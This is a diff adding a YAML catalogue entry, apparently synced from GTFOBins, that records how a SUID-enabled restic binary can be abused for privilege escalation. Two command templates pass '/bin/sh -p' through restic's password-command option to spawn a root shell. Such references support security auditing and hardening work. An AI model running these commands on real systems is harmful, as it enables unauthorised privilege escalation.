@@ -1,0 +1,25 @@
+id: gtfobins/restic/shell/suid
+type: binary
+platform: linux
+name: restic
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
+- template: restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
+references:
+- https://gtfobins.github.io/gtfobins/restic/
+tags:
+- linux
+- unix
+- gtfobins
